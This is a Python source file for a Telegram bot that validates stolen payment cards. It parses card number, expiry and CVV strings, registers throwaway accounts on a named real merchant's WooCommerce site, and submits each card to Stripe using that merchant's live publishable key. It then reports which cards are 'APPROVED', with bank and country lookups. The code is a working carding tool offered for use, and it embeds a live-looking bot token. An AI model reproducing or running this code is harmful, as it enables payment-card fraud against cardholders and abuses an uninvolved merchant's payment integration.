import re
import requests
import random
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

bot_token = '8003502803:AAHz0pg5zbhjZaeNsdR3FudgT2Yx1PMuF0s'  # <-- Replace this!
private_channel_id = -1002621183707  # Logging (optional), remove if you don't want logs

kk = "qwertyuiolmkjnhbgvfcdxszaQWEAERSTSGGZJDNFMXLXLVKPHPY1910273635519"

def extract_cc(text):
    return re.findall(r"\b\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}\b", text)

def get_bin_info(bin_number):
    try:
        url = f"https://lookup.binlist.net/{bin_number}"
        headers = {"Accept-Version": "3"}
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            country = data.get("country", {}).get("name", "UNKNOWN")
            emoji = data.get("country", {}).get("emoji", "")
            issuer = data.get("bank", {}).get("name", "UNKNOWN")
            scheme = data.get("scheme", "").upper()
            type_ = data.get("type", "UNKNOWN").upper()
            card_type = f"{type_} - {scheme}" if type_ != "UNKNOWN" else scheme
            return {
                "country": f"{country} {emoji}".strip(),
                "issuer": issuer,
                "type": card_type
            }
    except Exception as e:
        print("BIN lookup error:", e)
    return {
        "country": "UNKNOWN",
        "issuer": "UNKNOWN",
        "type": "UNKNOWN"
    }

def format_cc_result(ccx, status, site_response, bin_info, country, issuer, card_type, user_first_name):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"[ϟ] 𝗖𝗖 - <code>{ccx}</code>\n"
        f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
        f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {site_response}\n"
        f"[ϟ] 𝗚𝗮𝘁𝗲 - Stripe Auth\n"
        f"━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗕𝗶𝗻 : <code>{bin_info}</code>\n"
        f"[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country}\n"
        f"[ϟ] 𝗜𝘀𝘀𝘂𝗲𝗿 : {issuer}\n"
        f"[ϟ] 𝗧𝘆𝗽𝗲 : {card_type}\n"
        f"━━━━━━━━━━━━━\n"
        f"[ϟ] 𝗧𝗶𝗺𝗲 : {now}\n"
        f"[ϟ] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : <b>{user_first_name}</b>"
    )

def chk(ccx):
    def get_fresh_session():
        s = requests.session()
        r = (
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk)*2 +
            random.choice(kk) +
            random.choice(kk)
        )
        url = "https://infiniteautowerks.com/my-account/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-US,en;q=0.9,ar;q=0.8",
        }
        resp = s.get(url, headers=headers)
        try:
            nonce = resp.text.split('name="woocommerce-register-nonce" value=')[1].split('"')[1]
        except Exception:
            return None, None, None

        payload = {
            "email": f"{r}123@gmail.com",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        s.post(url, data=payload, headers=headers, cookies=s.cookies)
        return s, headers, s.cookies

    def get_payment_nonce(session, headers, cookies):
        url = "https://infiniteautowerks.com/my-account/add-payment-method/"
        resp = session.get(url, headers=headers, cookies=cookies)
        try:
            nonce1 = resp.text.split('createAndConfirmSetupIntentNonce":')[1].split('"')[1]
        except Exception:
            return None
        return nonce1

    session, headers, cookies = get_fresh_session()
    if session is None:
        return "Session setup failed.", "Could not start site session."
    nonce1 = get_payment_nonce(session, headers, cookies)
    if nonce1 is None:
        session, headers, cookies = get_fresh_session()
        nonce1 = get_payment_nonce(session, headers, cookies)
        if nonce1 is None:
            return "Payment nonce setup failed.", "Site error, cannot get payment nonce."

    try:
        cc = ccx.split("|")[0]
        exp = ccx.split("|")[1]
        exy = ccx.split("|")[2]
        if len(exy) == 4:
            exy = exy[2:]
        ccv = ccx.split("|")[3]
    except:
        return "Error: Card format.", "Error: Invalid card format."

    url = "https://api.stripe.com/v1/payment_methods"
    payload = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": ccv,
        "card[exp_year]": exy,
        "card[exp_month]": exp,
        "allow_redisplay": "unspecified",
        "billing_details[address][country]": "EG",
        "payment_user_agent": "stripe.js/d16ff171ee; stripe-js-v3/d16ff171ee; payment-element; deferred-intent",
        "referrer": "https://infiniteautowerks.com",
        "time_on_page": "19537",
        "client_attribution_metadata[client_session_id]": "8a3d508b-f6ba-4f16-be66-c59232f6afc0",
        "key": "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae",
        "_stripe_version": "2024-06-20",
    }
    stripe_headers = {
        "User-Agent": headers["User-Agent"],
        "Accept": "application/json",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
    }

    response = requests.post(url, data=payload, headers=stripe_headers)
    try:
        tok = response.json()["id"]
    except Exception as e:
        error_msg = response.json().get("error", {}).get("message", str(e))
        return "DECLINED ❌", error_msg

    url = "https://infiniteautowerks.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    payload = {
        "action": "create_and_confirm_setup_intent",
        "wc-stripe-payment-method": tok,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": nonce1,
    }
    confirm_headers = {
        "User-Agent": headers["User-Agent"],
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://infiniteautowerks.com",
        "referer": "https://infiniteautowerks.com/my-account/add-payment-method/",
        "accept-language": "en-US,en;q=0.9,ar;q=0.8",
    }
    resp = session.post(url, data=payload, headers=confirm_headers, cookies=cookies)
    txt = resp.text

    # Analyze response and message
    if "succeeded" in txt:
        return "APPROVED ✅", "Payment method successfully added ✅"
    elif "insufficient funds" in txt:
        return "APPROVED ✅", "Payment method successfully added ✅ (insufficient funds)"
    elif "incorrect_cvc" in txt or "security code is incorrect" in txt:
        return "DECLINED ❌", "Incorrect CVC"
    elif "card was declined" in txt:
        return "DECLINED ❌", "Card was declined"
    else:
        return "DECLINED ❌", (txt.strip()[:120] if txt else "Unknown site response.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("More Gateway 🚧", callback_data="more_gateway")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "<b>🚀 Coming Soon!\n\n"
        "This bot will soon support more gateways and features.\n"
        "Stay tuned! 👀</b>"
    )
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="HTML")

async def more_gateway_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        text="🚧 More Gateway coming soon!\nFollow updates for new features.",
        parse_mode="HTML"
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "Usage: <code>/chk xxxxxxxxxxxxxxxx|mm|yyyy|cvv</code>",
            parse_mode="HTML"
        )
        return
    text = " ".join(args)
    cc_list = extract_cc(text)
    if not cc_list:
        await update.message.reply_text("❗ No valid CC found in your input.")
        return

    user_first_name = update.effective_user.first_name

    for ccx in cc_list:
        bin_info = ccx.split('|')[0][:6]
        bin_data = await asyncio.to_thread(get_bin_info, bin_info)
        status, site_response = await asyncio.to_thread(chk, ccx)

        formatted_msg = format_cc_result(
            ccx=ccx,
            status=status,
            site_response=site_response,
            bin_info=bin_info,
            country=bin_data["country"],
            issuer=bin_data["issuer"],
            card_type=bin_data["type"],
            user_first_name=user_first_name
        )

        await update.message.reply_text(formatted_msg, parse_mode="HTML")
        # Uncomment below to log in your channel
        # await context.bot.send_message(
        #     chat_id=private_channel_id,
        #     text=formatted_msg,
        #     parse_mode="HTML"
        # )
        await asyncio.sleep(15)

def main():
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CallbackQueryHandler(more_gateway_callback, pattern="^more_gateway$"))
    app.run_polling()

if __name__ == "__main__":
    main()
